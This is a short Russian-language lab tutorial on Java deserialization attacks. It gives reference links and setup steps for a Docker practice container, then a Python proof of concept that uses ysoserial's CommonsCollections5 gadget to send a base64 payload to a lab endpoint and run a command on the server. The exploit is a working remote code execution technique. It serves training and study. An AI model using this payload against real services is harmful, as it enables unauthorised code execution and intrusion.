
# Ссылки

- https://github.com/frohoff/ysoserial
- https://nytrosecurity.com/2018/05/30/understanding-java-deserialization/
- http://gursevkalra.blogspot.com/2016/01/ysoserial-commonscollections1-exploit.html

## Развертывание

Запускаем [докер контейнер](https://github.com/GrrrDog/ZeroNights-WebVillage-2017/) для java. 
В данном примере уязвимый сервис будет находиться на http://java.lab


# Эксплуатация

## Шаг 1

Скачиваем [ysoserial](https://github.com/frohoff/ysoserial).

## Шаг 2

Используем следующий POC

```python
import requests
import urllib
import subprocess
import base64

# генерируем payload
payload = subprocess.check_output("java -jar ysoserial.jar CommonsCollections5 'touch /tmp/huck-you.txt'", shell=True)
# отправляем
result = requests.get('http://java.lab/ois?sess=%s' % (urllib.parse.quote(base64.b64encode(payload)),))
print(result.text)
```

Сгенерированный payload с помощью ysoserial запустит произвольный код на атакуемом сервере.